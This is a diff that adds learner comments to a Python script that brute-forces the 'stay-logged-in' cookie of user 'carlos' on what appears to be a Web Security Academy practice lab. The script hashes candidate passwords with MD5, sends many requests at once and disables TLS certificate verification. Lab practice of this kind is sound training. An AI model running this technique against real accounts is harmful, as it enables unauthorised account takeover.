@@ -7,7 +7,7 @@ import sys
 import ssl
 
 # Disable SSL verification warnings
-ssl_context = ssl.create_default_context()
+ssl_context = ssl.create_default_context() 
 ssl_context.check_hostname = False
 ssl_context.verify_mode = ssl.CERT_NONE
 
@@ -31,39 +31,39 @@ headers = {
     'Referer': 'https://0a5200800433a94a80ca854800830039.web-security-academy.net/'
 }
 
-found = asyncio.Event()
+found = asyncio.Event() # event to found later if any task found the group 
 
 async def attempt_password(sem, session, password, counter):
-    async with sem:
-        if found.is_set():
+    async with sem: # to set max 10 
+        if found.is_set(): # check if found yet
             return
-        sys.stdout.write(f'\rAttempt number: {counter}')
-        sys.stdout.flush()
+        sys.stdout.write(f'\rAttempt number: {counter}') # write attempt number
+        sys.stdout.flush() # flush into the terminal
 
-        cookie_val = base64.b64encode(f'carlos:{md5(password.encode()).hexdigest()}'.encode('ascii')).decode()
-        cookies = {'stay-logged-in': cookie_val}
+        cookie_val = base64.b64encode(f'carlos:{md5(password.encode()).hexdigest()}'.encode('ascii')).decode() # create each cookie for each password attempt in the current 10 semaphores
+        cookies = {'stay-logged-in': cookie_val} # set cookies 
 
-        try:
-            async with session.get(url, headers=headers, cookies=cookies, ssl=ssl_context) as r:
-                text = await r.text()
-                if 'logout' in text:
-                    found.set()
+        try: # try
+            async with session.get(url, headers=headers, cookies=cookies, ssl=ssl_context) as r: # now get session
+                text = await r.text() # await for r result so i will step outside and send another one 
+                if 'logout' in text: # found logout = means logged in
+                    found.set() # set flag
                     print(f'\n[+] Found password: {password}')
         except Exception as e:
             print(f'\n[-] Error: {e}')
 
 async def main():
-    before = time.time()
-    sem = asyncio.Semaphore(10)
-    connector = aiohttp.TCPConnector(ssl=ssl_context)
+    before = time.time() #just to get start time
+    sem = asyncio.Semaphore(10) # set semaphore to 10 tasks max
+    connector = aiohttp.TCPConnector(ssl=ssl_context) # setup a connection with aiohttp
 
-    async with aiohttp.ClientSession(connector=connector) as session:
-        tasks = [
-            attempt_password(sem, session, pwd, i+1)
+    async with aiohttp.ClientSession(connector=connector) as session: # prep 100 empty session to pass it directly to the coroutine 
+        tasks = [ # create the task list
+            attempt_password(sem, session, pwd, i+1) # 
             for i, pwd in enumerate(candidates)
         ]
-        await asyncio.gather(*tasks)
+        await asyncio.gather(*tasks) # fire the sessions 
     print(f'\nElapsed time: {time.time() - before:.2f}s')
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    asyncio.run(main()) # run the event loop
